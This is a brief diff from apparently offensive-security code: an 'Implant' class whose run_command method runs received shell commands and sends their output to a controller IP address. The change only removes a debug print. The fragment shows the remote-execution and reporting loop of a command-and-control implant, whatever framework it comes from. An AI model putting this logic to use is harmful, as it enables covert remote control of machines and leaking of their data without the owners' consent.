@@ -45,11 +45,9 @@ class Implant(Host):
             self.module_cache = "bash -c \""
 
     def run_command(self, cmd):
-        print(cmd)
         try:
             output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
             self.send(self.controller_ip, "instruction", output)
-            
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
         except Exception:
